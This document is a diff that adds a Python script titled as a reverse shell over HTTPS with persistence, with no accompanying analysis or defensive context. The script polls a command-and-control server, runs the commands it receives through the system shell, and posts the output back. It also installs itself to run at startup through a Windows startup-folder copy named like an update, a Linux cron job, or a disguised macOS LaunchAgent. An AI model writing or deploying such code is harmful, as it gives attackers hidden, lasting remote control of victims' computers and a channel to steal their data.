@@ -1,0 +1,89 @@
+RK
+Title: Reverse Shell over HTTPS with Persistence
+
+```python
+# language: Python, file: reverse_shell.py, target: Cross-platform (Windows, Linux, Mac)
+import os
+import sys
+import time
+import socket
+import subprocess
+import threading
+import requests
+import base64
+
+# Configuration
+C2_URL = "https://your_c2_server.com/endpoint"
+PERSISTENCE_METHOD = "startup"  # Options: startup, cron (Linux), plist (Mac)
+
+def establish_connection():
+    while True:
+        try:
+            response = requests.get(C2_URL)
+            command = base64.b64decode(response.text).decode('utf-8')
+            if command.lower() == "exit":
+                break
+            execute_command(command)
+        except requests.ConnectionError:
+            time.sleep(5)
+        except Exception as e:
+            pass
+
+def execute_command(command):
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        output = e.output
+    encoded_output = base64.b64encode(output).decode('utf-8')
+    requests.post(C2_URL, data=encoded_output)
+
+def persist():
+    if PERSISTENCE_METHOD == "startup":
+        startup_persistence()
+    elif PERSISTENCE_METHOD == "cron":
+        cron_persistence()
+    elif PERSISTENCE_METHOD == "plist":
+        plist_persistence()
+
+def startup_persistence():
+    if os.name == 'nt':  # Windows
+        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+        script_path = os.path.abspath(sys.argv[0])
+        persist_file = os.path.join(startup_folder, "winupdate.pyw")
+        with open(persist_file, 'w') as f:
+            f.write(open(script_path).read())
+
+def cron_persistence():
+    if os.name == 'posix':  # Linux
+        cron_job = f"@reboot python3 {os.path.abspath(sys.argv[0])}"
+        os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
+
+def plist_persistence():
+    if os.name == 'posix' and sys.platform == 'darwin':  # MacOS
+        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.update.plist')
+        script_path = os.path.abspath(sys.argv[0])
+        plist_content = f'''
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.update</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>python3</string>
+                <string>{script_path}</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+        </dict>
+        </plist>
+        '''
+        with open(plist_path, 'w') as f:
+            f.write(plist_content)
+        os.system(f'launchctl load {plist_path}')
+
+if __name__ == "__main__":
+    persist()
+    establish_connection()
+```
